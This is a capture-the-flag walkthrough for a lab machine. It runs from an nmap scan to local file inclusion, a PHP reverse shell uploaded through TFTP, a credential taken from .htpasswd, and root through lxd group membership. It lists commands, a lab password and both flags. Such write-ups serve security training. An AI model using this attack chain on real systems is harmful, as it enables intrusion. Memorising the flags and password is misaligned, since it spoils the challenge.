@@ -1,0 +1,69 @@
+We start with nmap scan: sudo nmap -sC -sV -p- --min-rate 5000 (target ip)
+
+We only get one tcp port open which is 80, so we know that there is a website running on this port.
+
+We will run dirbuster on that website. 
+
+Dirbuster didnt come up with useful findings.
+
+The url of the home page looks vulnerable. If we searched for local file inclusion payload, we will get some examples to try.
+
+If we try to replace the home.php with /etc/passwd, we find that we have read a file from the machine that is running this website. This means that this website is vulnerable to local file inclusion attacks.
+
+The file that we read gave us a clue. We see something called tftp. If we searched that we find tftp stands for trivial file transfer protocol. It is similar to FTP but it uses UDP instead of TCP.
+
+We will use nmap to search for UDP ports: nmap -sU (target ip).
+
+We get a udp port that is open which is 69 and the service that is running on it is tftp.
+
+To be able to communicate with such services,we need to use the tool tftp. We can install it if we dont already have it: sudo apt install tftp.
+
+The good thing about tftp that it doesnt need authentication, so anyone can connect to it. Also, we can upload any file that we want. We will be uploading a reverse shell file using php.
+
+After modifying the reverse shell file so it will work with us (chaning ip and port number), we now can connect using tftp: tftp (target ip).
+
+After connecting to the target server, we will upload the reverse shell file: put (file name).
+
+However, we dont know where the file that we just uploaded is stored. A simple Google search will inform us that files uploaded into tftp servers are stored in /var/lib/tftpboot.
+
+So, while running netcat to listen on the port that we sepecified in the php file, we will search: http://(target ip)/?file=/var/lib/tftpboot/(file name)
+
+We get a reverse shell. We need to upgrade this shell to make it more functional: python3 -c 'import pty;pty.spawn("/bin/bash")'.
+
+Since we know that there is a website running on this machine, so we will start from /var/www/html.
+
+If we listed the files in this directory: ls -la, we will notice a hidden file called .htpasswd, if we see what it contains, we will get the password for the user mike:Sheffield19.
+
+
+
+We can login as mike by: su mike. If we provide the password, we see that we are logged in as mike.
+
+user flag: a56ef91d70cfbf2cdb8f454c006935a1
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Privilge Escalation:
+
+By doing: groups, we find out that there is a group called lxd. If we Googled that, we find this info:LXD stands for "Linux Container Daemon." It is a system container manager for Linux systems that provides a high-level interface to manage and operate Linux containers, which are a form of lightweight virtualization.
+
+Even better, if we googled lxd exploit, we will find a HackTricks article talking about it and having the exploit demonstrated step-by-step. 
+
+On our machine, we will follow the first step. We will end up with these files: lxd.tar.xz and rootfs.squashfs
+
+We will need to upload these two files to the target machine. We will start a simple http server using python: python3 -m http.server 8000. 
+
+Swtitching back to the reverse shell on the target machine: wget http://(our ip):8000/lxd.tar.xz and 
+wget http://(our ip):8000/rootfs.squashfs
+
+Then, we will follow the rest of the steps.
+
+After doing every step, we should be logged in as root.
+
+
+
+
+root flag:c693d9c7499d9f572ee375d4c14c7bcf
+
+//END
+
+
